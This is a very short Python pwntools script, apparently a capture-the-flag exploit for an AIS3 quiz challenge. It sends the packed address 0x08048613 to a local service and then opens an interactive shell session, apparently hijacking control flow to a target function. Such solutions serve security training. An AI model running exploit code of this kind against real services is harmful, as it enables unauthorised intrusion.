from pwn import *
import time

context.update(arch="i386", os="linux")
#r = remote("quiz.ais3.org", 9561)
r = remote("127.0.0.1", 30001)

time.sleep(1)

r.sendline(p32(0x08048613))

time.sleep(1)

r.interactive()
